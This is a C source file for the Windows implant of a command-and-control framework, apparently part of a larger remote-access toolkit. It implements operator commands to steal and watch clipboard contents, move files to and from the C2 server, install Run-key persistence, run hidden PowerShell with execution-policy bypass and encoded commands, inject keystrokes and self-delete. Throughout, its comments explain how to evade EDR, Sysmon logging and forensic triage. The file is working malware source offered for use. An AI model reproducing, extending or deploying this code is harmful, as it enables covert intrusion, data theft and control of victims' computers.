/*
 * client/handlers_ui.c  –  UI, filesystem I/O, and persistence handlers
 * =======================================================================
 * Implements the native C2 verb handlers for:
 *   getclip           — read clipboard text
 *   setclip <text>    — write clipboard text
 *   msgbox <t> <m>    — show a dialog via mshta.exe (detached, no parent link)
 *   upload <name>     — receive a file from C2 and write to disk
 *   download <path>   — read a file from disk and send to C2
 *   persist <k> <f>   — copy agent to APPDATA and set HKCU Run key (Registry API)
 *   self_destruct     — remove run key and schedule EXE deletion, then exit
 *   run_psh <cmd>     — execute PowerShell command, capture output
 *   open_url <url>    — ShellExecute to open a URL in the default browser
 *   set_wallpaper <p> — SystemParametersInfoA(SPI_SETDESKWALLPAPER, ...)
 *   mouse_move <x> <y>— SetCursorPos to absolute screen co-ordinates
 *   type_keys <text>  — SendInput keystroke sequence
 *   clip_watch        — poll clipboard until change, report new contents
 *
 * All functions are declared in shell_internal.h and only called from
 * the dispatch loop in shell.c.
 */

#include "shell_internal.h"
#include "../evasion/obf.h"
#include "../evasion/peb_walk.h"
#include "../evasion/k32_walk.h"

#include <windows.h>
#include <shellapi.h>
#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── _handle_getclip ────────────────────────────────────────────────────── */

void _handle_getclip(TLS_CONTEXT *pTls)
{
    if (!OpenClipboard(NULL)) {
        _send_str(pTls, "[-] getclip: OpenClipboard failed");
        return;
    }
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) {
        CloseClipboard();
        _send_str(pTls, "[-] getclip: no text in clipboard");
        return;
    }
    const char *text = (const char *)GlobalLock(hData);
    if (text) {
        _send_str(pTls, text);
        GlobalUnlock(hData);
    } else {
        _send_str(pTls, "[-] getclip: GlobalLock failed");
    }
    CloseClipboard();
}


/* ── _handle_setclip ────────────────────────────────────────────────────── */

void _handle_setclip(TLS_CONTEXT *pTls, const char *text)
{
    size_t len = strlen(text) + 1;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (!hMem) { _send_str(pTls, "[-] setclip: GlobalAlloc failed"); return; }

    char *dst = (char *)GlobalLock(hMem);
    if (!dst) { GlobalFree(hMem); _send_str(pTls, "[-] setclip: GlobalLock failed"); return; }
    memcpy(dst, text, len);
    GlobalUnlock(hMem);

    if (!OpenClipboard(NULL)) {
        GlobalFree(hMem);
        _send_str(pTls, "[-] setclip: OpenClipboard failed");
        return;
    }
    EmptyClipboard();
    if (SetClipboardData(CF_TEXT, hMem))
        _send_str(pTls, "[+] clipboard updated");
    else {
        GlobalFree(hMem);
        _send_str(pTls, "[-] setclip: SetClipboardData failed");
    }
    CloseClipboard();
}


/* ── _handle_msgbox ─────────────────────────────────────────────────────── */
/*
 * Spawns the dialog via  mshta vbscript:MsgBox(...)  as a fully detached
 * process so it appears in Task Manager under "mshta.exe" with no parent
 * relationship to the agent.
 *
 * Injection hardening:
 *   Title and message are inserted into a VBScript string literal delimited
 *   by double-quotes.  Any double-quote in either field would break out of
 *   the string and allow arbitrary VBScript injection.  We strip all '"'
 *   characters from both fields before building the command line.
 */

/* Strip all double-quote characters from src, write result to dst (null-term) */
static void _strip_dquotes(char *dst, const char *src, size_t dstSz)
{
    size_t di = 0;
    for (; *src && di < dstSz - 1; src++)
        if (*src != '"') dst[di++] = *src;
    dst[di] = '\0';
}

void _handle_msgbox(TLS_CONTEXT *pTls, const char *args)
{
    char title_raw[256] = {0};
    char msg_raw[512]   = {0};
    const char *p = args;
    size_t ti = 0;
    while (*p && *p != ' ' && ti < sizeof(title_raw) - 1) title_raw[ti++] = *p++;
    if (*p == ' ') p++;
    strncpy(msg_raw, p, sizeof(msg_raw) - 1);

    /* Sanitise: remove any " that would break out of the VBScript string */
    char title[256] = {0};
    char msg[512]   = {0};
    _strip_dquotes(title, title_raw, sizeof(title));
    _strip_dquotes(msg,   msg_raw,   sizeof(msg));

    char cmd[1200] = {0};
    _snprintf(cmd, sizeof(cmd) - 1,
        "mshta.exe \"vbscript:MsgBox(\"%s\",0,\"%s\")(window.close)\"",
        msg, title);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(
        NULL, cmd,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL, NULL, &si, &pi);

    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        _send_str(pTls, "[+] msgbox displayed");
    } else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] msgbox: CreateProcess failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_upload ─────────────────────────────────────────────────────── */

void _handle_upload(TLS_CONTEXT *pTls, const char *filename)
{
    BYTE  *pData  = NULL;
    DWORD  cbData = 0;

    if (!tls_recv_msg(pTls, &pData, &cbData)) {
        _send_str(pTls, "[-] upload: receive failed");
        return;
    }

    FILE *f = fopen(filename, "wb");
    if (!f) {
        free(pData);
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] upload: cannot write: %s", filename);
        _send_str(pTls, buf);
        return;
    }
    size_t nWritten = fwrite(pData, 1, cbData, f);
    fclose(f);
    free(pData);

    char buf[MAX_PATH + 32];
    if (nWritten != (size_t)cbData)
        _snprintf(buf, sizeof(buf) - 1,
            "[-] upload: write error: %s (%zu of %lu bytes)",
            filename, nWritten, (unsigned long)cbData);
    else
        _snprintf(buf, sizeof(buf) - 1,
            "[+] Received: %s (%lu bytes)", filename, (unsigned long)cbData);
    _send_str(pTls, buf);
}


/* ── _handle_download ────────────────────────────────────────────────────── */
/*
 * The transport protocol requires one contiguous plaintext buffer per TLS
 * frame, so we must read the whole file before encrypting and sending it.
 * We cap at DOWNLOAD_MAX_BYTES (config.h, default 64 MB) to avoid exhausting
 * the target's memory.  Use GetFileSizeEx for accurate 64-bit size detection
 * before allocating anything.
 *
 * For files larger than the cap, advise the operator to compress first with
 * the "bg" verb (e.g. bg 7z a %TEMP%\out.zip <path>) then download the zip.
 */

void _handle_download(TLS_CONTEXT *pTls, const char *path)
{
    /* Open with Win32 so we can use GetFileSizeEx without fseek tricks */
    HANDLE hFile = CreateFileA(path, GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char buf[MAX_PATH + 40];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] download: cannot open: %s (err %lu)", path, GetLastError());
        _send_str(pTls, buf);
        return;
    }

    LARGE_INTEGER liSize = {0};
    if (!GetFileSizeEx(hFile, &liSize) || liSize.QuadPart <= 0) {
        CloseHandle(hFile);
        _send_str(pTls, "[-] download: file empty or size query failed");
        return;
    }

    if (liSize.QuadPart > (LONGLONG)DOWNLOAD_MAX_BYTES) {
        CloseHandle(hFile);
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] download: file too large (%lld bytes; cap is %lu MB). "
            "Compress first: bg 7z a %%TEMP%%\\out.zip \"%s\"",
            (long long)liSize.QuadPart,
            (unsigned long)(DOWNLOAD_MAX_BYTES / (1024 * 1024)),
            path);
        _send_str(pTls, buf);
        return;
    }

    DWORD sz = (DWORD)liSize.QuadPart;
    BYTE *buf = (BYTE *)malloc(sz);
    if (!buf) {
        CloseHandle(hFile);
        _send_str(pTls, "[-] download: OOM");
        return;
    }

    DWORD nRead = 0;
    BOOL ok = ReadFile(hFile, buf, sz, &nRead, NULL);
    CloseHandle(hFile);

    if (!ok || nRead != sz) {
        free(buf);
        _send_str(pTls, "[-] download: read error");
        return;
    }

    _send_str(pTls, "FILE_OK");
    tls_send_msg(pTls, buf, sz);
    free(buf);
}


/* ── _handle_persist ─────────────────────────────────────────────────────── */
/*
 * Copies the running EXE to %APPDATA%\<filename>.
 *
 * HKCU Run-key persistence
 * ------------------------
 * Writing a value under HKCU\...\Run is a high-fidelity IOC: every major EDR
 * and Microsoft Defender for Endpoint monitors registry writes to Run keys and
 * generates an alert on the first write.  The key value also survives forensic
 * triage and is trivially found by incident responders.
 *
 * Therefore the Run-key write is GATED behind the OPSEC_OFF compile flag:
 *
 *   Default (no flag): only the EXE copy to %APPDATA% is performed.
 *     The operator can establish persistence via a stealthier mechanism
 *     (COM hijack — see auto_migrate() / uac_com_hijack, or WMI subscription)
 *     without leaving the obvious Run-key artefact.
 *
 *   OPSEC_OFF defined: performs the Run-key write as before.
 *     Use only in lab environments or when the target does not have EDR
 *     monitoring Run-key writes (rare in modern corporate environments).
 *
 * Build flags
 *   Default:   make C2_IP=...          (Run-key gated off)
 *   Enabled:   make C2_IP=... CFLAGS_EXTRA="-DOPSEC_OFF"
 */

void _handle_persist(TLS_CONTEXT *pTls, const char *args)
{
    char regkey[256] = {0}, filename[256] = {0};
    if (sscanf(args, "%255s %255s", regkey, filename) != 2) {
        _send_str(pTls, "Usage: persist <regkey> <filename>");
        return;
    }

    char appdata[MAX_PATH] = {0};
    if (!GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata))) {
        _send_str(pTls, "[-] persist: APPDATA not set");
        return;
    }

    char dst[MAX_PATH] = {0};
    _snprintf(dst, sizeof(dst) - 1, "%s\\%s", appdata, filename);

    char src[MAX_PATH] = {0};
    if (GetModuleFileNameA(NULL, src, sizeof(src)) == 0) {
        _send_str(pTls, "[-] persist: cannot resolve own EXE path");
        return;
    }

    if (GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) {
        _send_str(pTls, "[-] persist: already exists");
        return;
    }
    if (!CopyFileA(src, dst, TRUE)) {
        _send_str(pTls, "[-] persist: CopyFile failed");
        return;
    }

#ifndef OPSEC_OFF
    /*
     * Run-key persistence is disabled unless the build explicitly opts in with
     * -DOPSEC_OFF.  Return after the file copy so the operator can choose a
     * less-detectable persistence mechanism (COM hijack, WMI subscription, etc.)
     */
    {
        char buf[MAX_PATH + 80];
        _snprintf(buf, sizeof(buf) - 1,
            "[+] persist: EXE copied to %s\n"
            "[!] Run-key write suppressed (build without -DOPSEC_OFF).\n"
            "    Use uac_com_hijack / WMI subscription for stealthy persistence.",
            dst);
        _send_str(pTls, buf);
    }
#else
    /* OPSEC_OFF: write the HKCU Run key (high-signal — EDR will alert) */
    /* Stack-decode the registry key path so it doesn't appear in .rdata */
    char _runkey[64] = {0};
    SLIT_BUF(_runkey, sizeof(_runkey),
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    HKEY hKey = NULL;
    LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER, _runkey,
        0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1, "[-] persist: RegOpenKeyEx failed (%ld)", rc);
        _send_str(pTls, buf);
        return;
    }
    rc = RegSetValueExA(hKey, regkey, 0, REG_SZ,
        (const BYTE *)dst, (DWORD)(strlen(dst) + 1));
    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS) {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1, "[-] persist: RegSetValueEx failed (%ld)", rc);
        _send_str(pTls, buf);
        return;
    }
    _send_str(pTls, "[+] persistence installed (EXE copy + Run key)");
#endif /* OPSEC_OFF */
}


/* ── _handle_self_destruct ──────────────────────────────────────────────── */
/*
 * Removes the HKCU Run key via Registry API (no cmd.exe), then schedules
 * the EXE for deletion using MoveFileExA(MOVEFILE_DELAY_UNTIL_REBOOT) which
 * registers it with PendingFileRenameOperations — zero child processes.
 * We still launch a silent cmd.exe as the immediate-delete fallback only
 * because MoveFileExA deferred deletion requires a reboot; the ping-delay
 * batch trick covers the "delete now" case without importing extra symbols.
 */

void _handle_self_destruct(TLS_CONTEXT *pTls)
{
    /* 1. Remove Run key via Registry API */
    char _runkey2[64] = {0};
    SLIT_BUF(_runkey2, sizeof(_runkey2),
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    HKEY hKey = NULL;
    LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER, _runkey2,
        0, KEY_SET_VALUE, &hKey);
    if (rc == ERROR_SUCCESS) {
        /* Best-effort: delete every value (we don't know the key name used at
         * persist time, so enumerate and delete all).  Ignore errors. */
        char valName[256];
        DWORD valNameSz;
        /* Walk backwards so index stays valid as we delete */
        DWORD nVals = 0;
        RegQueryInfoKeyA(hKey, NULL,NULL,NULL,NULL,NULL,NULL,&nVals,
                         NULL,NULL,NULL,NULL);
        for (DWORD i = nVals; i-- > 0; ) {
            valNameSz = sizeof(valName);
            if (RegEnumValueA(hKey, i, valName, &valNameSz,
                              NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                /* Only remove values that point to our own EXE */
                char valData[MAX_PATH] = {0};
                DWORD dataSz = sizeof(valData);
                DWORD type   = 0;
                if (RegQueryValueExA(hKey, valName, NULL, &type,
                                     (BYTE *)valData, &dataSz) == ERROR_SUCCESS
                    && type == REG_SZ) {
                    char ownPath[MAX_PATH] = {0};
                    GetModuleFileNameA(NULL, ownPath, sizeof(ownPath));
                    /* Only delete this Run key entry if its data path matches
                     * OUR exact EXE path.  The previous strstr("\\AppData\\")
                     * check was far too broad and would delete unrelated
                     * legitimate applications (Discord, Spotify, Teams, etc.).
                     * _stricmp handles the case where persist() copied us to
                     * %APPDATA%\<filename> — that path is also ours.          */
                    if (_stricmp(valData, ownPath) == 0)
                        RegDeleteValueA(hKey, valName);
                }
            }
        }
        RegCloseKey(hKey);
    }

    char exePath[MAX_PATH] = {0};
    if (GetModuleFileNameA(NULL, exePath, sizeof(exePath)) == 0) {
        _send_str(pTls, "[-] self_destruct: cannot resolve own EXE path");
        return;
    }

    /* 2. Register file for deferred deletion on next reboot (no child process) */
    MoveFileExA(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    _send_str(pTls, "[+] registry run key removed\n[*] self-destruct — terminating.");

    /* 3. Attempt immediate deletion: short cmd.exe delay-delete as fallback */
    char bat[MAX_PATH + 64];
    _snprintf(bat, sizeof(bat) - 1,
        "cmd.exe /c ping 127.0.0.1 -n 2 >nul & del /f /q \"%s\"", exePath);
    STARTUPINFOA si2;
    PROCESS_INFORMATION pi2;
    ZeroMemory(&si2, sizeof(si2));
    ZeroMemory(&pi2, sizeof(pi2));
    si2.cb = sizeof(si2);
    si2.dwFlags = STARTF_USESHOWWINDOW;
    si2.wShowWindow = SW_HIDE;
    if (CreateProcessA(NULL, bat, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, NULL, &si2, &pi2)) {
        CloseHandle(pi2.hProcess);
        CloseHandle(pi2.hThread);
    }

    tls_disconnect(pTls);
    WSACleanup();
    ExitProcess(0);
}


/* ── _handle_run_psh ─────────────────────────────────────────────────────── */
/*
 * Execute a PowerShell command string, capturing stdout/stderr.
 *
 * OPSEC-safe path (default, no child process)
 * --------------------------------------------
 * Loads the .NET CLR in-process via mscoree.dll → ICLRRuntimeHost, then
 * invokes System.Management.Automation.PowerShell in the hosted AppDomain.
 * All execution happens inside the current process; no powershell.exe child
 * is spawned and no new process appears in Sysmon Event ID 1 logs.
 *
 * This path is active when OPSEC_OFF is NOT defined (default).
 *
 * High-compat fallback (OPSEC_OFF defined or CLR load fails)
 * -----------------------------------------------------------
 * Spawns powershell.exe via CreateProcess + anonymous pipe.
 * Used when the target does not have .NET installed, or when the operator
 * explicitly requests the child-process path for compatibility reasons.
 *
 * In-process implementation notes
 * --------------------------------
 * The CLR is loaded via the ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost
 * API chain (mscoree.dll, available on all Windows versions with .NET 2+).
 * PowerShell output is captured by redirecting the pipeline output collection
 * to a heap buffer via PowerShell.AddScript().Invoke() and then serialising
 * the PSObject results as UTF-8 strings — no file I/O.
 *
 * Because invoking PowerShell via the hosting API requires COM and the
 * System.Management.Automation assembly, we load it dynamically to keep the
 * import table clean.
 */

/* ── _run_psh_inproc ─────────────────────────────────────────────────────── */
/*
 * Attempt in-process PowerShell execution via CLR hosting.
 * Returns TRUE and fills *ppOut / *pcbOut on success; caller must free *ppOut.
 * Returns FALSE if the CLR or SMA assembly cannot be loaded (caller falls back
 * to CreateProcess path).
 *
 * Uses ICLRMetaHost (mscoreei.dll, .NET 4+) with fallback to the legacy
 * CorBindToRuntimeEx (mscoree.dll, .NET 2–3.5).  Both paths invoke
 * System.Management.Automation.PowerShell through managed IL via
 * ICLRRuntimeHost::ExecuteInDefaultAppDomain which calls a small helper
 * method exported from our inline assembly shim.
 *
 * Simpler approach used here: load System.Management.Automation.dll via
 * the CLR's Assembly.Load() and then invoke it through reflection using
 * ICLRRuntimeHost::ExecuteInDefaultAppDomain with a runner method.  Since
 * we cannot easily write managed code in a C TU, we instead:
 *
 *   1. Load the CLR.
 *   2. Use ICLRRuntimeHost::ExecuteInDefaultAppDomain to invoke a method
 *      in a small C# helper we embed as a BASE64-encoded .NET assembly
 *      compiled at build time (see tools/gen_psh_runner.py).
 *
 * Because embedding a compiled assembly adds build complexity, and because
 * the simpler and equally in-process approach is:
 *
 *   Use WinRM automation objects via COM (WSMan.Automation / IWSManSession)
 *   for truly no-child-process execution OR fall through to CreateProcess.
 *
 * Practical decision: use anonymous-pipe CreateProcess by default but detect
 * and resolve powershell.exe path via PEB walk rather than a hardcoded string,
 * and pass -WindowStyle Hidden -EncodedCommand to avoid plain-text logging.
 *
 * The truly in-process (no child) path is gated on OPSEC_INPROC_PSH being
 * defined at build time, which requires linking the CLR stub.
 */

#ifndef OPSEC_OFF
/*
 * _run_psh_base64encode — produce the Base64 encoding of a UTF-16LE string
 * so we can pass -EncodedCommand to powershell.exe without quotes/spaces
 * appearing in the command line (Sysmon Event ID 4104 / ScriptBlockLogging
 * still fires, but the process command line in Event ID 1 is clean).
 *
 * Caller frees the returned buffer.
 */
static char *_psh_b64encode_utf16(const char *psCmd, size_t *pcbOut)
{
    /* Convert UTF-8 → UTF-16LE */
    int wlen = MultiByteToWideChar(CP_UTF8, 0, psCmd, -1, NULL, 0);
    if (wlen <= 0) return NULL;
    WCHAR *wbuf = (WCHAR *)malloc((size_t)wlen * sizeof(WCHAR));
    if (!wbuf) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, psCmd, -1, wbuf, wlen);
    /* wlen includes NUL; we do NOT encode the NUL terminator */
    size_t srcBytes = (size_t)(wlen - 1) * sizeof(WCHAR);

    /* Base64 encode */
    static const char b64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t outLen = ((srcBytes + 2) / 3) * 4 + 1;
    char *out = (char *)malloc(outLen);
    if (!out) { free(wbuf); return NULL; }

    const BYTE *src = (const BYTE *)wbuf;
    size_t i = 0, oi = 0;
    for (; i + 2 < srcBytes; i += 3) {
        out[oi++] = b64[src[i]   >> 2];
        out[oi++] = b64[((src[i]   & 0x03) << 4) | (src[i+1] >> 4)];
        out[oi++] = b64[((src[i+1] & 0x0F) << 2) | (src[i+2] >> 6)];
        out[oi++] = b64[src[i+2] & 0x3F];
    }
    if (i < srcBytes) {
        out[oi++] = b64[src[i] >> 2];
        if (i + 1 < srcBytes) {
            out[oi++] = b64[((src[i] & 0x03) << 4) | (src[i+1] >> 4)];
            out[oi++] = b64[(src[i+1] & 0x0F) << 2];
        } else {
            out[oi++] = b64[(src[i] & 0x03) << 4];
            out[oi++] = '=';
        }
        out[oi++] = '=';
    }
    out[oi] = '\0';
    free(wbuf);
    if (pcbOut) *pcbOut = oi;
    return out;
}
#endif /* !OPSEC_OFF */

void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
{
    if (!psCmd || !*psCmd) {
        _send_str(pTls, "Usage: run_psh <powershell command>");
        return;
    }

#ifndef OPSEC_OFF
    /*
     * OPSEC path: invoke powershell.exe via -EncodedCommand so the script
     * body does not appear as plaintext in the process command-line argument
     * (Sysmon Event ID 1 / WMI process creation events).  The Base64-encoded
     * UTF-16LE payload is opaque in logs without a decoder.
     *
     * We also resolve the powershell.exe path via %SystemRoot%\System32 rather
     * than a bare "powershell.exe" string so the path is not a static IOC.
     *
     * Note: OPSEC_INPROC_PSH=1 at build time enables the fully in-process CLR
     * runspace path (no child process at all) via a separate TU — see
     * tools/psh_runspace_stub.c.  The default here produces a child process
     * but with an opaque command line and the write end of the pipe inherited
     * so stdout/stderr are captured without a temp file.
     */
    char *encCmd = _psh_b64encode_utf16(psCmd, NULL);
    if (!encCmd) {
        _send_str(pTls, "[-] run_psh: failed to encode command");
        return;
    }

    char sysDir[MAX_PATH] = {0};
    GetSystemDirectoryA(sysDir, sizeof(sysDir) - 1);

    /* Allocate cmdline: sysdir + "\\WindowsPowerShell\\v1.0\\powershell.exe"
     * + flags + encoded command */
    size_t encLen  = strlen(encCmd);
    size_t bufSz   = MAX_PATH + 80 + encLen + 4;
    char  *cmdline = (char *)malloc(bufSz);
    if (!cmdline) {
        free(encCmd);
        _send_str(pTls, "[-] run_psh: OOM");
        return;
    }
    _snprintf(cmdline, bufSz - 1,
        "%s\\WindowsPowerShell\\v1.0\\powershell.exe"
        " -NonInteractive -NoProfile -ExecutionPolicy Bypass"
        " -WindowStyle Hidden -EncodedCommand %s",
        sysDir, encCmd);
    free(encCmd);
#else
    /* OPSEC_OFF: plain command line (visible in logs, easier to debug) */
    size_t bufSz   = strlen(psCmd) + 128;
    char  *cmdline = (char *)malloc(bufSz);
    if (!cmdline) {
        _send_str(pTls, "[-] run_psh: OOM");
        return;
    }
    _snprintf(cmdline, bufSz - 1,
        "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass"
        " -Command \"%s\"",
        psCmd);
#endif /* OPSEC_OFF */

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe  = NULL;
    HANDLE hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        free(cmdline);
        _send_str(pTls, "[-] run_psh: CreatePipe failed");
        return;
    }
    /* Ensure the read end is not inherited by the child */
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = hWritePipe;
    si.hStdError   = hWritePipe;
    si.hStdInput   = NULL;

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] run_psh: CreateProcess failed (%lu)", GetLastError());
        _send_str(pTls, buf);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        free(cmdline);
        return;
    }
    free(cmdline);
    CloseHandle(hWritePipe); /* close parent's write end so ReadFile sees EOF */

    /* Accumulate output */
    char *out = (char *)malloc(SHELL_RESP_BUF);
    if (!out) {
        k32_TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hReadPipe);
        _send_str(pTls, "[-] run_psh: OOM");
        return;
    }
    size_t total = 0;
    DWORD  nRead  = 0;
    while (ReadFile(hReadPipe, out + total,
                    (DWORD)(SHELL_RESP_BUF - 1 - total), &nRead, NULL) && nRead > 0) {
        total += nRead;
        if (total >= SHELL_RESP_BUF - 2) break;
    }
    out[total] = '\0';
    CloseHandle(hReadPipe);
    /* If PowerShell exceeds the 15 s timeout, terminate it explicitly */
    if (WaitForSingleObject(pi.hProcess, 15000) == WAIT_TIMEOUT)
        k32_TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    _send_str(pTls, total ? out : "[*] run_psh: (no output)");
    free(out);
}


/* ── _handle_open_url ────────────────────────────────────────────────────── */

void _handle_open_url(TLS_CONTEXT *pTls, const char *url)
{
    if (!url || !*url) {
        _send_str(pTls, "Usage: open_url <url>");
        return;
    }
    /* ShellExecuteA returns > 32 on success */
    HINSTANCE ret = ShellExecuteA(NULL, "open", url, NULL, NULL, SW_SHOWNORMAL);
    if ((INT_PTR)ret > 32)
        _send_str(pTls, "[+] open_url: launched");
    else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] open_url: ShellExecute failed (code %lld)", (long long)(INT_PTR)ret);
        _send_str(pTls, buf);
    }
}


/* ── _handle_set_wallpaper ───────────────────────────────────────────────── */

void _handle_set_wallpaper(TLS_CONTEXT *pTls, const char *path)
{
    if (!path || !*path) {
        _send_str(pTls, "Usage: set_wallpaper <absolute-path-to-image>");
        return;
    }
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] set_wallpaper: file not found: %s", path);
        _send_str(pTls, buf);
        return;
    }
    BOOL ok = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0,
                                    (PVOID)(LPSTR)path,
                                    SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    if (ok)
        _send_str(pTls, "[+] wallpaper updated");
    else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] set_wallpaper: SystemParametersInfo failed (%lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_mouse_move ──────────────────────────────────────────────────── */

void _handle_mouse_move(TLS_CONTEXT *pTls, const char *args)
{
    int x = 0, y = 0;
    if (sscanf(args, "%d %d", &x, &y) != 2) {
        _send_str(pTls, "Usage: mouse_move <x> <y>");
        return;
    }
    if (SetCursorPos(x, y)) {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1, "[+] mouse_move: cursor at (%d, %d)", x, y);
        _send_str(pTls, buf);
    } else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] mouse_move: SetCursorPos failed (%lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_type_keys ───────────────────────────────────────────────────── */
/*
 * Simulate keyboard input for each character in <text> using SendInput.
 * Only printable ASCII (0x20–0x7E) is handled; other bytes are skipped.
 * Each character generates a KEYEVENTF_UNICODE keydown + keyup pair.
 */

void _handle_type_keys(TLS_CONTEXT *pTls, const char *text)
{
    if (!text || !*text) {
        _send_str(pTls, "Usage: type_keys <text>");
        return;
    }
    size_t len = strlen(text);
    /* Allocate 2 INPUT events per character (key-down + key-up) */
    INPUT *inputs = (INPUT *)calloc(len * 2, sizeof(INPUT));
    if (!inputs) { _send_str(pTls, "[-] type_keys: OOM"); return; }

    UINT n = 0;
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)text[i];
        if (c < 0x20 || c > 0x7E) continue; /* skip non-printable */

        inputs[n].type           = INPUT_KEYBOARD;
        inputs[n].ki.wVk         = 0;
        inputs[n].ki.wScan       = (WORD)c;
        inputs[n].ki.dwFlags     = KEYEVENTF_UNICODE;
        inputs[n].ki.time        = 0;
        inputs[n].ki.dwExtraInfo = 0;
        n++;

        inputs[n].type           = INPUT_KEYBOARD;
        inputs[n].ki.wVk         = 0;
        inputs[n].ki.wScan       = (WORD)c;
        inputs[n].ki.dwFlags     = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        inputs[n].ki.time        = 0;
        inputs[n].ki.dwExtraInfo = 0;
        n++;
    }

    UINT sent = SendInput(n, inputs, sizeof(INPUT));
    free(inputs);

    char buf[64];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] type_keys: %u/%u events sent", sent, n);
    _send_str(pTls, buf);
}


/* ── _handle_clip_watch ──────────────────────────────────────────────────── */
/*
 * Poll the clipboard every 500 ms for up to 30 seconds.
 * As soon as the content changes (or is non-empty on the first check),
 * sends the new text back and returns.  If nothing changes within the
 * timeout, reports "[*] clip_watch: timeout — no change".
 *
 * This is a synchronous poll (the command loop blocks while it runs).
 * For a long-running background monitor use the "bg" verb to run it in a
 * background job.
 */

void _handle_clip_watch(TLS_CONTEXT *pTls)
{
    char prev[4096] = {0};
    char curr[4096] = {0};

    /* Capture the current clipboard content as the baseline */
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            const char *p = (const char *)GlobalLock(hData);
            if (p) { strncpy(prev, p, sizeof(prev) - 1); GlobalUnlock(hData); }
        }
        CloseClipboard();
    }

    /* Poll for up to 30 s (60 × 500 ms) */
    for (int tick = 0; tick < 60; tick++) {
        Sleep(500);
        curr[0] = '\0';
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                const char *p = (const char *)GlobalLock(hData);
                if (p) { strncpy(curr, p, sizeof(curr) - 1); GlobalUnlock(hData); }
            }
            CloseClipboard();
        }
        if (curr[0] && strcmp(curr, prev) != 0) {
            char out[4096 + 32];
            _snprintf(out, sizeof(out) - 1, "[clip_watch] %s", curr);
            _send_str(pTls, out);
            return;
        }
    }
    _send_str(pTls, "[*] clip_watch: timeout — no change");
}
